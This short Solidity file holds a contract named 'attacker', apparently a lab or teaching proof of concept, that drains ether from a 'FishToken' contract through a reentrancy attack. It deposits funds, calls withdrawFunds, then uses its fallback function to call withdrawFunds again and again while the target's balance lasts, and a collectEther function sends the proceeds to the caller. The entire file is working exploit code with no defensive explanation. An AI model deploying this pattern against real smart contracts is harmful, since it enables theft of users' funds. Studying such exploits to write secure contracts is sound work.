pragma solidity ^0.4.24;

import "./code.sol";

contract attacker {

    FishToken public fishToken;

    constructor(address _fishTokenAddress){
        fishToken = FishToken(_fishTokenAddress);
    }

    function pwnEtherStore() public payable {
        fishToken.issueTokens.value(10000)();
        fishToken.withdrawFunds(10000);
    }

    function collectEther() public {
        msg.sender.transfer(this.balance);
    }

    function() payable {
        if (fishToken.balance > 10000) {
            fishToken.withdrawFunds(10000);
        }
    }
}
